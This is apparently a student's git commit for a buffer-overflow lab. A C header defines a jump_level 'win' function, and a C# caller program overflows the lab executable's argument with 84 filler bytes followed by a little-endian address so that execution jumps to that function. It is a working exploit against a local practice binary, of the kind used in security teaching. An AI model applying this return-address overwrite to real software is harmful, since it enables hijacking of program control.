317dc57b8f23c2abdc038b60c991ca918ad20e77
kamen4 <voldemar.exe@gmail.com>
2025-10-21 05:10:21 +0300

    Add project files.

---
+++ Lab1/CPPApp/jump_level.h
@@ -0,0 +1,6 @@
+#include "stdio.h"
+#include "string.h"
+
+void jump_level(int n) {
+	printf("HOOOORAY go to %d level!", n);
+}
---
+++ Lab1/CallerApp/Program.cs
@@ -0,0 +1,69 @@
+﻿using System.Diagnostics;
+using System.Text;
+
+namespace CallerApp;
+
+public class Program
+{
+
+    static async Task Main(string[] args)
+    {
+        //string exePath = @"..\..\..\..\level12.exe";
+        string exePath = @"..\..\..\..\CPPApp\Debug\CPPApp.exe";
+
+        string addr = await CallExe(exePath, "1");
+        string clearAddr = addr[2..].Trim();
+        byte[] clearAddrBytes = Convert.FromHexString(clearAddr).Reverse().ToArray();
+
+        StringBuilder sb = new();
+        sb.Append('1', 84);
+        foreach (var b in clearAddrBytes)
+        {
+            sb.Append((char)b);
+        }
+
+        _ = await CallExe(exePath, sb.ToString(), false);
+    }
+
+    static async Task<string?> CallExe(string path, string args, bool ro = true)
+    {
+        try
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = path,
+                UseShellExecute = false,
+                RedirectStandardOutput = ro,
+                RedirectStandardError = ro,
+                Arguments = args
+            };
+
+            using (Process process = new())
+            {
+                process.StartInfo = startInfo;
+                process.Start();
+
+                if (ro)
+                {
+                    string output = await process.StandardOutput.ReadToEndAsync();
+                    string error = await process.StandardError.ReadToEndAsync();
+
+                    Console.WriteLine(output);
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        Console.WriteLine(error);
+                    }
+                    await process.WaitForExitAsync();
+                    return output;
+                }
+
+                return null;
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error: {ex.Message}");
+            return null;
+        }
+    }
+}
